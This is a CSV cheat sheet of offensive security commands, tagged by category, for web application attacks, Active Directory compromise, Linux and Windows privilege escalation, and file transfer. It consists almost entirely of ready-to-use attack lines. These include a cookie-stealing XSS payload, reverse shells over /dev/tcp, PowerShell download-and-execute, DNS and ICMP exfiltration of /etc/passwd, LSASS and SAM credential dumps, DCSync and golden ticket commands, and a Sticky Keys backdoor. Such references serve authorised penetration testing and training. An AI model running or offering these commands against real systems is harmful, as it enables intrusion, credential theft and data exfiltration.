Command,Cmd,Tags,Page
SQLMap Basic Scan,"sqlmap -u ""[URL]?[PARAM]=1"" --batch --risk=3 --level=5","WebApp,SQL Injection",https://sqlmap.org/
SQLMap with Cookie,"sqlmap -u ""[URL]"" --cookie=""[COOKIE]"" --dbs --batch","WebApp,SQL Injection",
SQLMap OS Shell,"sqlmap -u ""[URL]?[PARAM]=1"" -D [DATABASE] --os-shell","WebApp,SQL Injection",
NoSQL Injection MongoDB,nosqlmap -t [URL] -p [PARAM] --attack=2,"WebApp,NoSQLMap",
XSS Payload Testing,"xsstrike -u ""[URL]?[PARAM]=test"" --crawl","WebApp,XSS",
XSS Stored Payload,<script>fetch('http://[IP]/steal?c='+document.cookie)</script>,"WebApp,XSS",
Command Injection Test,"commix -u ""[URL]?[PARAM]=id"" --batch","WebApp,Command Injection",
OS Command Bypass,[PARAM]=;cat+/etc/passwd%0a,"WebApp,Command Injection",
LFI Basic Test,[URL]?[PARAM]=../../../../etc/passwd,"WebApp,LFI",
LFI PHP Wrapper,[URL]?[PARAM]=php://filter/convert.base64-encode/resource=index.php,"WebApp,LFI",
LFI to RCE Log Poisoning,"curl -s '[URL]' -H 'User-Agent: <?php system($_GET[""cmd""]); ?>'","WebApp,RFI",
XXE File Read,"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>","WebApp,XXE",
XXE SSRF Attack,"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://[IP]:8080/"">]><root>&xxe;</root>","WebApp,XXE",
SSRF AWS Metadata,[URL]?[PARAM]=http://169.254.169.254/latest/meta-data/,"WebApp,SSRF",
JWT Secret Brute,jwt_tool [TOKEN] -C -d [WORDLIST],"WebApp,JWT",
JWT Algorithm None,jwt_tool [TOKEN] -X a,"WebApp,JWT",
GraphQL Introspection,"{__schema{types{name,fields{name}}}}","WebApp,GraphQL",
GraphQL Query Dump,graphql-cop -t [URL] -o json,"WebApp,GraphQL",
Nuclei Web Scan,"nuclei -u [URL] -t ~/nuclei-templates/ -severity critical,high","WebApp,Nuclei",
Subdomain Enumeration,subfinder -d [DOMAIN] -all -recursive | httpx -mc 200,"WebApp,Enumeration",
Directory Fuzzing,"ffuf -u [URL]/FUZZ -w [WORDLIST] -mc 200,301,302,403 -fs 0","WebApp,Fuzzing",
Vhost Discovery,gobuster vhost -u [URL] -w [WORDLIST] --append-domain,"WebApp,Enumeration",
Parameter Discovery,arjun -u [URL] -m GET POST,"WebApp,Enumeration",
Burp Collaborator Check,"curl -X POST [URL] -d ""callback=http://[BURP_COLLAB]""","WebApp,SSRF",
File Upload Bypass Double Extension,mv shell.php shell.php.jpg,"WebApp,File Upload",
File Upload Magic Bytes,"echo -e ""\xFF\xD8\xFF\xE0"" | cat - shell.php > shell.php.jpg","WebApp,File Upload",
CORS Misconfiguration Test,"curl -H ""Origin: http://evil.com"" [URL] -I","WebApp,CORS",
CRLF Injection Test,[URL]?[PARAM]=value%0d%0aSet-Cookie:%20admin=true,"WebApp,CRLF",
Prototype Pollution,__proto__[isAdmin]=true,"WebApp,JavaScript",
Template Injection,{{7*7}}${7*7}<%= 7*7 %>,"WebApp,SSTI",
SSTI RCE Python,{{config.__class__.__init__.__globals__['os'].popen('id').read()}},"WebApp,SSTI",
Kerbrute User Enum,kerbrute userenum --dc [DCIP] -d [DOMAIN] [WORDLIST],"Active Directory,Enumeration",
AS-REP Roasting,GetNPUsers.py [DOMAIN]/ -no-pass -usersfile users.txt -dc-ip [DCIP],"Active Directory,ASREPRoasting",
Kerberoasting GetUserSPNs,GetUserSPNs.py [DOMAIN]/[USER]:[PASSWORD] -dc-ip [DCIP] -request,"Active Directory,Kerberoasting",
Golden Ticket Attack,ticketer.py -nthash [HASH] -domain-sid [SID] -domain [DOMAIN] Administrator,"Active Directory,Golden Ticket",
Silver Ticket Creation,ticketer.py -nthash [HASH] -domain-sid [SID] -domain [DOMAIN] -spn cifs/[TARGET] [USER],"Active Directory,Silver Ticket",
DCSync Attack,secretsdump.py [DOMAIN]/[USER]:[PASSWORD]@[DCIP] -just-dc,"Active Directory,DCSync",
Pass-the-Hash,psexec.py [DOMAIN]/[USER]@[IP] -hashes :[HASH],"Active Directory,Pass-the-Hash",
Pass-the-Ticket,export KRB5CCNAME=[TICKET]; psexec.py [DOMAIN]/[USER]@[TARGET] -k -no-pass,"Active Directory,Pass-the-Ticket",
SMB Relay Attack,ntlmrelayx.py -tf targets.txt -smb2support -i,"Active Directory,SMB",
Responder LLMNR/NBT-NS,responder -I eth0 -dwPv,"Active Directory,Responder",
BloodHound Collection,bloodhound-python -u [USER] -p [PASSWORD] -d [DOMAIN] -dc [DCIP] -c all,"Active Directory,BloodHound",
LDAP Anonymous Bind,"ldapsearch -x -H ldap://[DCIP] -b ""DC=[DOMAIN],DC=local"" -s base","Active Directory,LDAP",
LDAP Enumeration Auth,ldapdomaindump [DCIP] -u [DOMAIN]\\[USER] -p [PASSWORD],"Active Directory,LDAP",
DNS Zone Transfer,dnsrecon -d [DOMAIN] -n [DCIP] -t axfr,"Active Directory,DNS",
RPC Enumeration,"rpcclient -U """" -N [IP] -c enumdomusers","Active Directory,Enumeration",
NetExec SMB Shares,netexec smb [IP] -u [USER] -p [PASSWORD] --shares,"Active Directory,SMB",
NetExec Password Spray,netexec smb [IP]/24 -u users.txt -p [PASSWORD] --continue-on-success,"Active Directory,Password Spraying",
Mimikatz DCSync,lsadump::dcsync /domain:[DOMAIN] /user:Administrator,"Active Directory,Mimikatz",
Rubeus Kerberoasting,Rubeus.exe kerberoast /outfile:hashes.txt,"Active Directory,Rubeus",
PowerView Domain Enum,Get-NetDomain | Get-NetDomainController,"Active Directory,PowerView",
SharpHound Collection,SharpHound.exe -c all -d [DOMAIN] --zipfilename output.zip,"Active Directory,Sharphound",
ADCS Certificate Abuse,Certify.exe find /vulnerable /domain:[DOMAIN],"Active Directory,Certificate Services",
Coerced Authentication,PetitPotam.py -d [DOMAIN] -u [USER] -p [PASSWORD] [DCIP] [TARGET],"Active Directory,PetitPotam",
PrintNightmare Exploit,CVE-2021-34527.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET] '\\[IP]\share\shell.dll',"Active Directory,PrintNightmare",
ZeroLogon Check,zerologon_tester.py [DC_NAME] [DCIP],"Active Directory,ZeroLogon",
Machine Account Quota,addcomputer.py -computer-name 'FAKE$' -computer-pass [PASSWORD] [DOMAIN]/[USER]:[PASSWORD],"Active Directory,Machine Account",
RBCD Attack,rbcd.py -f FAKE$ -t [TARGET] -dc-ip [DCIP] [DOMAIN]/[USER]:[PASSWORD],"Active Directory,RBCD",
Exchange PrivExchange,privexchange.py -t https://[EXCHANGE] -ah [IP] [DOMAIN]/[USER]:[PASSWORD],"Active Directory,Exchange",
WSUS Exploitation,"SharpWSUS.exe create /payload:""C:\Windows\System32\calc.exe"" /args:"""" /title:""Test""","Active Directory,WSUS",
LinPEAS Enumeration,curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh,"Linux,Linux Privesc",
SUID Binary Search,find / -perm -4000 -type f 2>/dev/null,"Linux,Linux Privesc,SUID",
Capabilities Search,getcap -r / 2>/dev/null,"Linux,Linux Privesc,Capabilities",
Writable /etc/passwd,openssl passwd -1 -salt root password | sed 's/^/root:/' >> /etc/passwd,"Linux,Linux Privesc",
Cron Job Hijacking,echo 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1' > /tmp/script.sh,"Linux,Linux Privesc,Cron Jobs",
PATH Hijacking,echo '/bin/bash' > /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH,"Linux,Linux Privesc,Path Hijacking",
LD_PRELOAD Exploit,"echo 'void _init() {setuid(0);system(""/bin/bash"");}' > /tmp/pe.c && gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c","Linux,Linux Privesc,LD_PRELOAD",
Docker Escape,docker run -v /:/mnt --rm -it alpine chroot /mnt sh,"Linux,Linux Privesc,Docker",
LXC/LXD Exploitation,lxc image import alpine*.tar.gz --alias myimage && lxc init myimage mycontainer -c security.privileged=true,"Linux,Linux Privesc,LXC",
Kernel Exploit Suggester,curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash,"Linux,Linux Privesc,Kernel Exploit",
Sudo -l Exploitation,sudo -l | grep NOPASSWD,"Linux,Linux Privesc,Sudo",
GTFOBins Python,"python -c 'import os; os.setuid(0); os.system(""""/bin/bash"""")'","Linux,Linux Privesc,GTFOBins,Python",
GTFOBins Vim,vim -c ':!/bin/bash',"Linux,Linux Privesc,GTFOBins",
PostgreSQL Command Exec,"COPY (SELECT '') TO PROGRAM 'bash -c """"bash -i >& /dev/tcp/[IP]/[PORT] 0>&1""""';","Linux,Linux Privesc,PostgreSQL",
Systemctl Exploitation,"echo '[Service]\nType=oneshot\nExecStart=/bin/bash -c """"chmod +s /bin/bash""""\n[Install]\nWantedBy=multi-user.target' > /tmp/root.service","Linux,Linux Privesc,Systemd",
Wildcard Injection tar,"echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh && echo """" > '--checkpoint=1' && echo """" > '--checkpoint-action=exec=sh shell.sh'","Linux,Linux Privesc",
NFS Root Squash,showmount -e [IP] && mount -t nfs [IP]:/share /mnt -o vers=3,"Linux,Linux Privesc,NFS",
Process Monitoring pspy,./pspy64 -pf -i 1000,"Linux,Linux Privesc,pspy",
Shared Library Hijacking,"ldd /usr/bin/binary | grep ""not found"" && gcc -shared -fPIC -o /tmp/lib.so exploit.c","Linux,Linux Privesc,Library Hijacking",
Python Library Hijacking,"echo 'import os;os.system(""""/bin/bash"""")' > /tmp/library.py && export PYTHONPATH=/tmp:$PYTHONPATH","Linux,Linux Privesc,Python",
Logrotate Exploitation,echo '/var/log/test.log {\n\tdaily\n\trotate 3\n\tpostrotate\n\t\tchmod +s /bin/bash\n\tendscript\n}' > /etc/logrotate.d/exploit,"Linux,Linux Privesc",
Polkit CVE-2021-4034,pkexec /bin/bash,"Linux,Linux Privesc",
DirtyCOW Exploitation,gcc -pthread dirty.c -o dirty -lcrypt && ./dirty,"Linux,Linux Privesc,Kernel Exploit",
WinPEAS Enumeration,.\winPEASx64.exe quiet servicesinfo applicationsinfo,Windows Privesc,
PowerUp Invoke-AllChecks,"powershell -ep bypass -c ""IEX(New-Object Net.WebClient).downloadString('http://[IP]/PowerUp.ps1'); Invoke-AllChecks""","Windows Privesc,PowerShell",
Unquoted Service Path,"wmic service get name,displayname,pathname,startmode | findstr /i ""auto"" | findstr /i /v ""c:\windows\\"" | findstr /i /v """"""""""",Windows Privesc,
AlwaysInstallElevated,reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated,Windows Privesc,
Service Binary Hijacking,"sc qc [SERVICE] && icacls ""C:\path\to\service.exe""",Windows Privesc,
DLL Hijacking Search,"echo %PATH% && dir /s /b *.dll 2>nul | findstr /i ""program""",Windows Privesc,
Registry Autoruns,reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run,Windows Privesc,
Scheduled Tasks Enum,"schtasks /query /fo LIST /v | findstr /B /C:""TaskName"" /C:""Run As User""",Windows Privesc,
Token Impersonation,".\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a ""/c net user admin password123! /add"" -t *","Windows Privesc,JuicyPotato",
PrintSpoofer Exploit,.\PrintSpoofer.exe -i -c cmd.exe,Windows Privesc,
SeImpersonatePrivilege,whoami /priv | findstr SeImpersonatePrivilege,Windows Privesc,
SAM Database Dump,reg save HKLM\SAM C:\temp\sam && reg save HKLM\SYSTEM C:\temp\system,Windows Privesc,
LSASS Memory Dump,rundll32.exe C:\windows\System32\comsvcs.dll MiniDump [PID] C:\temp\lsass.dmp full,Windows Privesc,
Cached Credentials,"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultPassword",Windows Privesc,
Weak Service Permissions,"accesschk.exe /accepteula -uwcqv ""Authenticated Users"" *",Windows Privesc,
PowerShell History,type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt,"Windows Privesc,PowerShell",
Saved RDP Credentials,cmdkey /list,Windows Privesc,
GPP Password Extraction,findstr /S /I cpassword \\[DOMAIN]\sysvol\[DOMAIN]\policies\*.xml,Windows Privesc,
UAC Bypass fodhelper,"REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ && REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d ""cmd.exe""",Windows Privesc,
Sticky Keys Backdoor,"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe""",Windows Privesc,
Windows Exploit Suggester,python windows-exploit-suggester.py --database 2023-10-12-mssb.xls --systeminfo systeminfo.txt,Windows Privesc,
KrbRelayUp Local PrivEsc,.\KrbRelayUp.exe relay -m rbcd -cn FAKE$ -cp Password123!,"Windows Privesc,Kerberos",
Python HTTP Server,python3 -m http.server [PORT] --bind [IP],File Transfer,
PHP HTTP Server,php -S [IP]:[PORT],File Transfer,
Netcat Transfer Send,nc -lvnp [PORT] < file.txt,"File Transfer,Netcat",
Netcat Transfer Receive,nc [IP] [PORT] > file.txt,"File Transfer,Netcat",
PowerShell Download,"powershell -c ""(New-Object System.Net.WebClient).DownloadFile('http://[IP]/file.exe', 'C:\temp\file.exe')""","File Transfer,PowerShell",
PowerShell IEX Download,"powershell ""IEX(New-Object Net.WebClient).downloadString('http://[IP]/script.ps1')""""","File Transfer,PowerShell",
Certutil Download,certutil.exe -urlcache -split -f http://[IP]/file.exe file.exe,File Transfer,
Bitsadmin Download,bitsadmin /transfer myDownloadJob /download /priority normal http://[IP]/file.exe C:\temp\file.exe,File Transfer,
Curl Windows Download,curl.exe -o file.exe http://[IP]/file.exe,File Transfer,
Wget Linux Download,wget http://[IP]/file.txt -O /tmp/file.txt,File Transfer,
SCP Transfer,scp file.txt [USER]@[IP]:/tmp/,"File Transfer,SSH",
Rsync Transfer,"rsync -avz -e ""ssh -p [PORT]"" file.txt [USER]@[IP]:/tmp/","File Transfer,SSH",
SMB Server Impacket,impacket-smbserver share . -smb2support -user test -password test,"File Transfer,SMB",
SMB Client Upload,"smbclient //[IP]/share -U [USER] -c ""put file.txt""","File Transfer,SMB",
FTP Upload,"echo -e ""open [IP]\nuser [USER] [PASSWORD]\nbinary\nput file.exe\nquit"" | ftp -n","File Transfer,FTP",
TFTP Transfer,tftp -i [IP] PUT file.exe,File Transfer,
Base64 Transfer Encode,base64 -w 0 file.bin > file.b64,File Transfer,
Base64 Transfer Decode,"echo ""[BASE64_STRING]"" | base64 -d > file.bin",File Transfer,
Hex Dump Transfer,xxd -p file.bin | tr -d '\n' > file.hex && xxd -r -p file.hex file.bin,File Transfer,
DNS Exfiltration,nslookup $(cat /etc/passwd | base64 | head -1).[DOMAIN],"File Transfer,DNS",
ICMP Exfiltration,xxd -p -c 16 file.txt | while read line; do ping -p $line -c 1 [IP]; done,File Transfer,
Living Off The Land wmic,"wmic process call create ""\\[IP]\share\file.exe""",File Transfer,
Powershell Bits Transfer,"[System.Net.WebClient]::new().DownloadFile('http://[IP]/file.exe','C:\temp\file.exe')","File Transfer,PowerShell",
Invoke-WebRequest,Invoke-WebRequest -Uri http://[IP]/file.zip -OutFile C:\temp\file.zip,"File Transfer,PowerShell",
Start-BitsTransfer,Start-BitsTransfer -Source http://[IP]/file.exe -Destination C:\temp\,"File Transfer,PowerShell",
MsXml Download,"$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://[IP]/file.exe',$false);$h.send();iex $h.responseText","File Transfer,PowerShell",
VBS Download Script,"echo strUrl = WScript.Arguments.Item(0) > wget.vbs && echo StrFile = WScript.Arguments.Item(1) >> wget.vbs && echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs && echo Err.Clear >> wget.vbs",File Transfer,
Debug.exe Transfer,echo open [IP] [PORT] > ftp.txt && echo USER anonymous >> ftp.txt && echo binary >> ftp.txt && echo GET file.exe >> ftp.txt && echo bye >> ftp.txt && ftp -v -n -s:ftp.txt,File Transfer,
Socat File Transfer,socat TCP4-LISTEN:[PORT];fork file:file.txt,"File Transfer,Socat",
OpenSSL Transfer Encrypted,openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k [PASSWORD],File Transfer,
Tar Over SSH,tar czf - /path/to/files | ssh [USER]@[IP] 'tar xzf - -C /destination',"File Transfer,SSH",
DD Over Netcat,dd if=/dev/sda | gzip -1 - | nc [IP] [PORT],"File Transfer,Netcat",
Git Clone via HTTP,git clone http://[IP]/repo.git,File Transfer,
Wget Spider Mode,wget --spider -r -nd -nv -H -l 1 http://[IP]/,File Transfer,
Aria2c Parallel Download,aria2c -x 16 -s 16 http://[IP]/largefile.iso,File Transfer,
Rclone Mount Cloud,rclone mount remote:path /local/path --daemon,File Transfer,
